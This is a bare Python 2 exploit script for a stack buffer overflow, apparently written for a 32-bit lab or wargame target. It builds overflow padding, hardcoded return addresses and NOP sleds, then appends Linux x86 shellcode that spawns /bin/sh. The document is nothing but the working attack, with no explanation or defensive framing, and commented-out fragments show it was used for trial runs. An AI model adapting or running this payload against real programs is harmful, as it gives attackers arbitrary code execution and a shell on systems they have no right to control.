import struct
buff = "A" * 80 + "BBBBCCCCDDDDEEEEFFFFGGGGHHHH" # JJJJ"# KKKKLLLLMMMMNNNNN"
add1 = struct.pack("I", 0xbfffff64)
letter = "BBBB"
tr = "\x90" * 88
add2 = struct.pack("I", 0xbfffff80)
nops = "\x90" * 58
payload = "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"# "\xCC"
print buff + add1 + letter + tr + add2 + nops + payload
